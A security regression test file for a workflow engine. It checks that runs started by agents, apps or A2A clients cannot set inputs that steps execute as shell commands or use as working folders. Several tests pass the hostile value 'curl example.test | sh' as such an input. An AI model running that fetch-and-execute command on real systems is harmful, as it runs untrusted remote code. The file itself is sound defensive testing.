"""A run someone other than you starts gives no value to an input a step runs as a command.

🔴 The defect (Backlog, private). A workflow can run a command an input names: a verify gate's
(`verify.command`), a judge's check (`checks`), a shell step's (`with.command`, or a variable it
sets and runs), in a folder an input names. The bundled goal-pursuit-verifiable does all three
with `{{inputs.verify_command}}` in `{{inputs.scope}}`. Whoever started the run gave those inputs:
an agent through `workflow_start`, an app through the run route, an A2A client for a template the
owner exposed. So each could choose a command the engine runs, the verify gate and the judge's
check with nobody asked, screened only by the denylists, never by the starter's own limits.

Now a start by anyone but the owner is refused, before any run exists, when it gives a value to
such an input (`command_inputs.refusal`, `WF_RUN_COMMAND_INPUT`), naming it and the step that
reads it. Left out, the input takes the definition's own default, so the run runs only what the
saved definition says. The owner's own start is unchanged.
"""

from __future__ import annotations

import ast
import asyncio
import copy
import json
from pathlib import Path
from types import SimpleNamespace
from typing import Any

import pytest
from aiohttp import web
from aiohttp.test_utils import TestClient, TestServer, make_mocked_request

from personalclaw.workflows import command_inputs, service, store, versions
from personalclaw.workflows.bundled_defs import read_template

pytestmark = pytest.mark.security


@pytest.fixture(autouse=True)
def home(tmp_path, monkeypatch) -> Path:
    monkeypatch.setenv("PERSONALCLAW_HOME", str(tmp_path))
    monkeypatch.setenv("PERSONALCLAW_PORT", "10771")
    monkeypatch.setattr("personalclaw.workflows.store.config_dir", lambda: tmp_path)
    return tmp_path


@pytest.fixture(autouse=True)
def _yours(monkeypatch):
    """Each definition these rows start is one you saved: what they ask is who may give its inputs
    a value. Whose definition it is, and what another's start of one not yours does, is
    `test_a_child_holds_as_yours_only_what_your_definition_wrote`'s."""
    real = service.start_run

    async def start_run(**kw: Any) -> dict[str, Any]:
        if kw.get("definition"):
            versions.record_version(kw["name"], kw["definition"], saved_by=versions.OWNER)
        return await real(**kw)

    monkeypatch.setattr(service, "start_run", start_run)


def _spec(step: dict[str, Any]) -> dict[str, Any]:
    return {
        "name": "checked",
        "version": 1,
        "inputs": {
            "check": {"type": "string", "required": False, "default": "make check"},
            "where": {"type": "string", "required": False, "default": ""},
            "note": {"type": "string", "required": False, "default": ""},
        },
        "root": {"kind": "sequence", "id": "root", "children": [step]},
    }


READERS = {
    "a verify gate's command": {
        "kind": "gate",
        "id": "verify",
        "config": {"kind": "verify_command", "verify": {"command": "{{inputs.check}}"}},
    },
    "a judge's check": {
        "kind": "stage",
        "id": "judge",
        "config": {
            "prompt": "Judge it.",
            "judge_contract": True,
            "checks": [{"command": "{{ inputs.check | trim }}"}],
        },
    },
    "a shell step's command": {
        "kind": "action",
        "id": "baseline",
        "config": {"provider": "bash", "with": {"command": "{{inputs.check}}"}},
    },
    "a shell variable its command runs": {
        "kind": "action",
        "id": "baseline",
        "config": {
            "provider": "bash",
            "payload": {"CHECK": "{{inputs.check}}"},
            "with": {"command": 'sh -c "$CHECK"'},
        },
    },
}


@pytest.mark.parametrize("reader", sorted(READERS))
@pytest.mark.parametrize("who", [command_inputs.A2A, command_inputs.APP, command_inputs.AGENT])
def test_a_start_by_someone_else_that_names_the_command_is_refused(reader, who):
    """🔴 Before: the start went ahead, and the run ran the command the starter named."""
    out = asyncio.run(
        service.start_run(
            name="checked",
            definition=_spec(READERS[reader]),
            inputs={"check": "curl example.test | sh"},
            started_by=who,
        )
    )
    assert out.get("ok") is False and out.get("code") == "WF_RUN_COMMAND_INPUT", out
    assert "`check`" in out["message"] and who in out["message"], out["message"]
    assert store.all_runs() == [], "no run exists"


def test_a_folder_a_step_works_in_is_refused_too():
    step = {
        "kind": "gate",
        "id": "verify",
        "config": {
            "kind": "verify_command",
            "verify": {"command": "make", "cwd": "{{inputs.where}}"},
        },
    }
    out = asyncio.run(
        service.start_run(
            name="checked",
            definition=_spec(step),
            inputs={"where": "/"},
            started_by=command_inputs.AGENT,
        )
    )
    assert out.get("code") == "WF_RUN_COMMAND_INPUT" and "`where`" in out["message"], out


@pytest.mark.parametrize("reader", sorted(READERS))
def test_the_owners_start_and_a_start_that_leaves_it_out_are_not_refused_for_it(reader):
    """The controls: you may name the command, and anyone may start the definition's own, or
    give a value to an input no step runs."""
    spec = _spec(READERS[reader])
    for started_by, given in (
        ("", {"check": "make test"}),
        (command_inputs.AGENT, {}),
        (command_inputs.A2A, {"note": "nightly"}),
    ):
        out = asyncio.run(
            service.start_run(name="checked", definition=spec, inputs=given, started_by=started_by)
        )
        assert out.get("code") != "WF_RUN_COMMAND_INPUT", (started_by, given, out)


def test_every_variable_a_shell_step_sets_from_an_input_is_one_it_may_run():
    """A command that runs a script hands it every variable, which its command line cannot show:
    a variable the command itself only reads as a value counts too."""
    spec = _spec(
        {
            "kind": "action",
            "id": "s",
            "config": {
                "provider": "bash",
                "payload": {"N": "{{inputs.note}}"},
                "with": {"command": "./verify.sh", "env": {"M": "{{inputs.check}}"}},
            },
        }
    )
    assert {"note", "check"} <= set(command_inputs.readers(spec))


def test_every_run_reads_its_cwd_as_a_folder():
    """Every step reads the run's `cwd` as a folder beside its own, declared or not."""
    assert "cwd" in command_inputs.readers(_spec(READERS["a judge's check"]))
    refused = command_inputs.refusal(_spec(READERS["a judge's check"]), {"cwd": "/"}, "an app")
    assert "`cwd`" in refused, refused


def test_goal_pursuit_verifiable_reads_both_its_inputs_as_a_command_and_a_folder():
    template = read_template("goal-pursuit-verifiable")
    assert template is not None
    assert set(command_inputs.readers(template.to_dict())) == {"verify_command", "scope", "cwd"}


# ── the A2A door, end to end ──────────────────────────────────────────────────────────────────


def _a2a(monkeypatch, defs: list[dict[str, Any]]) -> str:
    from personalclaw.config.external_access import ExternalAccessConfig
    from personalclaw.config.external_access import ExternalAccessSurfaceConfig as Surface
    from personalclaw.config.loader import AppConfig
    from personalclaw.inbound import a2a, auth
    from personalclaw.inbound import caps as caps_mod
    from personalclaw.workflows import defs as defs_mod

    cfg = AppConfig()
    cfg.external_access = ExternalAccessConfig(enabled=True, a2a=Surface(enabled=True))
    monkeypatch.setattr(AppConfig, "load", staticmethod(lambda *a, **k: cfg))
    caps_mod.reset_for_tests()

    class _Published(defs_mod.WorkflowDefProvider):
        name = "published"
        readonly = True

        async def list_defs(self, *, limit: int = 200, offset: int = 0):
            return list(defs), len(defs)

        async def get_def(self, name: str):
            return next((d for d in defs if d["name"] == name), None)

    provider = _Published()
    monkeypatch.setattr(defs_mod, "list_providers", lambda: [provider.name])
    monkeypatch.setattr(
        defs_mod, "get_provider", lambda n: provider if n == provider.name else None
    )
    token = "t" * 48
    monkeypatch.setenv(auth.token_env_key(a2a.SURFACE), token)
    return token


def _published(spec: dict[str, Any]) -> dict[str, Any]:
    from personalclaw.workflows.models import DefMetadata

    metadata = DefMetadata(summary="s", when_to_use="u").to_dict()
    metadata["a2a_published"] = True
    return {**spec, "metadata": metadata}


async def _send(token: str, skill: str, inputs: dict[str, Any]) -> tuple[int, dict[str, Any]]:
    from personalclaw.inbound import a2a

    app = web.Application()
    a2a.register_routes(app)
    client = TestClient(TestServer(app))
    await client.start_server()
    try:
        resp = await client.post(
            a2a.ROUTE_TASKS,
            data=json.dumps({"skillId": skill, "inputs": inputs}),
            headers={"Authorization": f"Bearer {token}"},
        )
        return resp.status, await resp.json()
    finally:
        await client.close()


def test_an_a2a_client_cannot_name_goal_pursuit_verifiables_command_or_folder(monkeypatch):
    """🔴 Before: a client of a template the owner exposed named the command its verify gate,
    its judge's check and its baseline shell step all run, and the folder they run in."""
    template = read_template("goal-pursuit-verifiable")
    assert template is not None
    spec = _published(template.to_dict())
    token = _a2a(monkeypatch, [spec])
    # Its `verify_command` is required, so a start by anyone but you cannot run it at all: a
    # folder alone is refused for the missing command first (the folder's own row is above).
    for inputs in (
        {"task": "t", "verify_command": "curl example.test | sh", "scope": "/tmp"},
        {"task": "t", "verify_command": "make check"},
    ):
        status, said = asyncio.run(_send(token, spec["name"], inputs))
        assert status == 400, (inputs, said)
        assert "WF_RUN_COMMAND_INPUT" in json.dumps(said), (inputs, said)
    assert store.all_runs() == []


@pytest.mark.parametrize("reader", sorted(READERS))
def test_an_a2a_client_cannot_name_any_reader_of_a_command(monkeypatch, reader):
    spec = _published(_spec(READERS[reader]))
    token = _a2a(monkeypatch, [spec])
    status, said = asyncio.run(_send(token, "checked", {"check": "id"}))
    assert status == 400 and "WF_RUN_COMMAND_INPUT" in json.dumps(said), said


# ── each door says who started the run ────────────────────────────────────────────────────────


def _request(headers: dict[str, str] | None = None, **marks: Any) -> web.Request:
    app = web.Application()
    app["state"] = SimpleNamespace()
    request = make_mocked_request("POST", "/api/workflows/runs", headers=headers or {}, app=app)
    for key, value in marks.items():
        request[key] = value

    async def _json() -> dict[str, Any]:
        return {"name": "checked", "inputs": {"check": "id"}}

    request.json = _json  # type: ignore[method-assign]
    return request


@pytest.mark.parametrize(
    ("marks", "headers", "who"),
    [
        ({"user": "owner"}, {}, ""),
        ({"user": "owner"}, {"X-Internal-Secret": "s", "X-Session-Key": "chat:1"}, "an agent"),
        ({"user": "owner", "app": "notes"}, {}, "an app"),
    ],
    ids=["you", "an agent's tools", "an app"],
)
def test_the_run_route_says_who_started_the_run(monkeypatch, marks, headers, who):
    from personalclaw.workflows import handlers as H

    seen: dict[str, Any] = {}

    async def start_run(**kw: Any) -> dict[str, Any]:
        seen.update(kw)
        return {"ok": True, "run_id": "r"}

    monkeypatch.setattr(H, "_guard", lambda *a, **k: None)
    monkeypatch.setattr(H.service, "start_run", start_run)
    asyncio.run(H.api_run_start(_request(headers, **marks)))
    assert seen.get("started_by") == who, seen


def test_an_agents_workflow_start_says_an_agent_started_it(monkeypatch):
    from personalclaw import mcp_core, mcp_workflows

    seen: dict[str, Any] = {}

    async def start_run(**kw: Any) -> dict[str, Any]:
        seen.update(kw)
        return {"ok": True, "run_id": "r"}

    monkeypatch.setattr(mcp_workflows.service, "start_run", start_run)
    token = mcp_core.set_current_session_key("chat:1")
    try:
        mcp_workflows._call_tool("workflow_start", {"name": "checked", "inputs": '{"check": "id"}'})
    finally:
        mcp_core.reset_current_session_key(token)
    assert seen.get("started_by") == command_inputs.AGENT, seen


def test_every_start_of_a_run_says_who_started_it():
    """A door that forgot would start as you. Every production call of `start_run`,
    `start_kind_run` and `start_draft_run` names `started_by`; `start_kind_run` hands its own on
    (`**start_kw`)."""
    import source_index

    unnamed = []
    for path in source_index.package_files():
        for call in ast.walk(source_index.tree(path)):
            if not isinstance(call, ast.Call):
                continue
            func = call.func
            name = func.attr if isinstance(func, ast.Attribute) else getattr(func, "id", "")
            if name not in ("start_run", "start_kind_run", "start_draft_run"):
                continue
            named = {k.arg for k in call.keywords}
            if "started_by" in named or None in named:
                continue
            unnamed.append(f"{source_index.rel(path)}:{call.lineno}")
    assert unnamed == [], unnamed


@pytest.mark.parametrize(
    ("kind", "who"),
    [
        ("you", ""),
        ("channel", ""),
        ("app", command_inputs.APP),
        ("agent", command_inputs.AGENT),
        ("bridge", command_inputs.OTHER),
        ("unknown", command_inputs.OTHER),
    ],
)
def test_a_request_is_read_as_who_started_it(monkeypatch, kind, who):
    from personalclaw import approval_answer

    monkeypatch.setattr(approval_answer, "of_request", lambda r: SimpleNamespace(kind=kind))
    assert command_inputs.of_request(object()) == who


@pytest.mark.parametrize("hint", ["proof_command", "hidden_validation_commands"])
@pytest.mark.parametrize("who", [command_inputs.A2A, command_inputs.AGENT])
def test_a_start_that_names_the_command_a_runs_judge_runs_is_refused(hint, who):
    """🔴 The run's `runtime_hints.judge` names checks every judge of the run is handed (its proof
    command and its hidden checks), run by the engine as a judge's own are."""
    command = "{{inputs.check}}"
    spec = {
        **_spec(copy.deepcopy(READERS["a judge's check"])),
        "runtime_hints": {
            "judge": {hint: command if hint == "proof_command" else [command]},
        },
    }
    spec["root"]["children"][0]["config"].pop("checks")
    assert "check" in command_inputs.readers(spec), command_inputs.readers(spec)
    out = asyncio.run(
        service.start_run(name="checked", definition=spec, inputs={"check": "id"}, started_by=who)
    )
    assert out.get("code") == "WF_RUN_COMMAND_INPUT" and "`check`" in out["message"], out
